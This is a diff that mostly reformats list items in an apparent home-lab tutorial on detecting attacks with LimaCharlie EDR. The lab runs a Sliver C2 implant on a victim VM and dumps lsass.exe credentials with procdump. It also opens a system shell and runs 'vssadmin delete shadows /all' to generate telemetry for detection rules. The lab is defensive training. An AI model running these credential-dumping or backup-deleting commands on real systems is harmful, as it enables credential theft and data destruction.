@@ -357,7 +357,7 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
     [server] sliver (payload_name) > whoami
     [server] sliver (payload_name) > getprivs
     ```
-        1. If your **implant** was properly run with **Admin rights**, you’ll notice we have a few **privileges** that make further attack activity much easier, such as **SeDebugPrivilege** — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.
+    - If your **implant** was properly run with **Admin rights**, you’ll notice we have a few **privileges** that make further attack activity much easier, such as **SeDebugPrivilege** — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.
     3. Identify our **implant’s working directory**:
     ```
     [server] sliver (payload_name) > pwd
@@ -366,13 +366,13 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
     ```
     [server] sliver (payload_name) > netstat
     ```
-        1. Notice that **Sliver cleverly highlights its own process in green**.
-        2. **rphcp.exe** is the **LimaCharlie EDR service executable**.
+    - Notice that **Sliver cleverly highlights its own process in green**.
+    - **rphcp.exe** is the **LimaCharlie EDR service executable**.
     5. Identify **running processes** on the remote system:
     ```
     [server] sliver (payload_name) > ps -T
     ```
-        1. Notice that **Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red**.
+    - Notice that **Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red**.
 
 ## Step 8: Observe EDR Telemetry So Far
 1. Let’s hop into the **LimaCharlie web UI** (https://app.limacharlie.io/) and check out some basic features:
@@ -408,13 +408,13 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
     ```
     [server] sliver (payload_name) > getprivs
     ```
-        1. A powerful privilege to check for is **SeDebugPrivilege** which opens the door for many things. If you’ve got that, we’re good. If you don’t you need to **relaunch your C2 implant with administrative rights** as we did in **Step 7**.
+    - A powerful privilege to check for is **SeDebugPrivilege** which opens the door for many things. If you’ve got that, we’re good. If you don’t you need to **relaunch your C2 implant with administrative rights** as we did in **Step 7**.
     2. Next, let’s do something adversaries love to do for **stealing credentials** on a system — **dump the lsass.exe process from memory**. Read more about this technique here (https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/):
     ```
     [server] sliver (payload_name) > procdump -n lsass.exe -s lsass.dmp
     ```
-        1. This will **dump the remote process from memory**, and **save it locally on your Sliver C2 server**. We are not going to further process the lsass dump, but I’ll leave it as an exercise for the reader if you want to try your hand (https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz) at it.
-        2. **NOTE:** This will fail if you did not launch your C2 payload with admin rights on the Windows system. If it still fails for an unknown reason (RPC error, etc), don’t fret, it likely still generated the telemetry we needed. Move on and see if you can still detect the attempt.
+    - This will **dump the remote process from memory**, and **save it locally on your Sliver C2 server**. We are not going to further process the lsass dump, but I’ll leave it as an exercise for the reader if you want to try your hand (https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz) at it.
+    - **NOTE:** This will fail if you did not launch your C2 payload with admin rights on the Windows system. If it still fails for an unknown reason (RPC error, etc), don’t fret, it likely still generated the telemetry we needed. Move on and see if you can still detect the attempt.
 
 ## Step 10: Let’s Create the Detection Rule
 1. Now that we’ve done something adversarial, let’s switch over to
@@ -431,14 +431,14 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
         path: event/*/TARGET/FILE_PATH
         value: lsass.exe
         ```
-            1. We’re specifying that this detection should only look at **SENSITIVE_PROCESS_ACCESS** events where the victim or target process ends with **lsass.exe**
-                1. For posterity let me state, this rule would be very noisy and need further tuning in a production environment, but for the purpose of this learning exercise, simple is better.
+        - We’re specifying that this detection should only look at **SENSITIVE_PROCESS_ACCESS** events where the victim or target process ends with **lsass.exe**
+            - For posterity let me state, this rule would be very noisy and need further tuning in a production environment, but for the purpose of this learning exercise, simple is better.
         3. In the **Respond** section of the new rule, remove all contents and replace them with this:
         ```
         - action: report
           name: LSASS access
         ```
-            1. We’re telling **LimaCharlie** to simply generate a **detection report** anytime this detection occurs. For more advanced response capabilities, check out the docs. We could ultimately tell this rule to do all sorts of things (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions), like terminate the offending process chain, etc. Let’s keep it simple for now.
+        - We’re telling **LimaCharlie** to simply generate a **detection report** anytime this detection occurs. For more advanced response capabilities, check out the docs. We could ultimately tell this rule to do all sorts of things (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions), like terminate the offending process chain, etc. Let’s keep it simple for now.
         4. Now let’s test our rule against the event we built it for. Lucky for us, **LimaCharlie** carried over that event it provides a quick and easy way to test the **D&R logic**:
             1. Click **Target Event** below the **D&R rule** you just wrote.
                 1. Here you will see the **raw event** we observed in the timeline earlier.
@@ -462,7 +462,7 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
 \> vssadmin delete shadows /all
 ```
 
-## Step 12: Let’s Detect It!
+## Step 12: Let’s Attack and Detect It!
 1. Get back onto an **SSH session on the Linux VM**, and drop into a **C2 session on your victim**:
     1. Retrace your steps from **Step 7** if need be.
     2. If you have issues reestablishing your **HTTP listener**, try rebooting your Ubuntu system.
@@ -470,12 +470,12 @@ PS\> C:\Users\User\Downloads\[your_C2-implant].exe
 ```
 [server] sliver (payload_name) > shell
 ```
-    1. When prompted with **This action is bad OPSEC, are you an adult?** type **Y** and hit enter.
+- When prompted with **This action is bad OPSEC, are you an adult?** type **Y** and hit enter.
 3. In the new **System shell**, run the following command:
 ```
 PS C:\Windows\system32> vssadmin delete shadows /all
 ```
-    1. The output is not important as there may or not be **Volume Shadow Copies** available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.
+- The output is not important as there may or not be **Volume Shadow Copies** available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.
 4. Run the **whoami** command to verify we still have an **active system shell**:
 ```
 PS C:\Windows\system32> whoami
@@ -504,11 +504,11 @@ PS C:\Windows\system32> whoami
 ```
 PS C:\Windows\system32> vssadmin delete shadows /all
 ```
-    1. The command should succeed, but the **action of running the command** is what will **trigger** our **D&R rule**.
+- The command should succeed, but the **action of running the command** is what will **trigger** our **D&R rule**.
 2. Now, to test if our **D&R rule** properly terminated the parent process, **check to see if you still have an active system shell** by rerunning the **whoami** command:
 ```
 PS C:\Windows\system32> whoami
 ```
-    1. If our **D&R rule** worked successfully, the **system shell will (exit) hang and fail to return anything from the whoami** command, because the **parent process was terminated**.
-    2. This is effective because in a **real ransomware scenario**, the parent process is likely the **ransomware payload** or **lateral movement tool** that would be terminated in this case.
+- If our **D&R rule** worked successfully, the **system shell will (exit) hang and fail to return anything from the whoami** command, because the **parent process was terminated**.
+- This is effective because in a **real ransomware scenario**, the parent process is likely the **ransomware payload** or **lateral movement tool** that would be terminated in this case.
 3. **Terminate your (now dead) system shell** by pressing **Ctrl + D**.
